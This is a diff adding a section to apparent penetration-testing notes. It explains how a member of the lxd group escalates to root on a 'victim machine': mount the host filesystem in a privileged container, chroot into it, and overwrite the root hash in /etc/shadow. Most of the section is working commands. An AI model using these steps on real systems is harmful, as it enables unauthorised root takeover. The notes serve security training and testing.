@@ -468,3 +468,59 @@ References:
 - [Script's Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
 
 ---------------------------------
+
+### Abusing group `lxd`
+
+- If a user is part of the user `lxd`,we can create a vulnerable container and breakout as root
+
+![image](https://github.com/user-attachments/assets/b84714a0-20dd-440d-a8f1-40e13d8f7bb4)
+
+- Initialize lxd with `lxd init` and add this settings
+
+![image](https://github.com/user-attachments/assets/28d07b8e-944c-4889-9872-6f15b4ff94cf)
+
+- Create this a container in your machine and build with root
+
+      git clone https://github.com/saghul/lxd-alpine-builder.git
+      cd lxd-alpine-builder
+      ./build-alpine
+
+- Transfer it to the victim machine,receive in the user's home directory
+
+- Import with
+
+      lxc image import [tar file] --alias alpine
+      lxc image list #To list images
+
+![image](https://github.com/user-attachments/assets/1fe4327a-67ca-4ef9-9e1f-0b0f634abb78)
+
+- The next step is to run a privileged container, so it runs as root
+
+      lxc init alpine juggernaut -c security.privileged=true
+      lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
+      lxc start juggernaut
+      lxc list
+
+![image](https://github.com/user-attachments/assets/d3ebab8c-5738-4817-8c9b-5a4bbcadce18)
+
+- Then execute juggernaut
+
+      lxc exec juggernaut sh
+
+- Use `chroot /mnt/root` to change root filesystem since we've mounted it
+
+![image](https://github.com/user-attachments/assets/f7c9426f-b04c-4539-bce9-2afa182b4ec8)
+
+- Then,you can replace the root hash in `/etc/shadow` and login as root
+
+---------------------
+
+### REFERENCES
+
+- [Juggernaut Sec](https://juggernaut-sec.com/lxd-container/)
+
+----------------------
+
+  
+
+
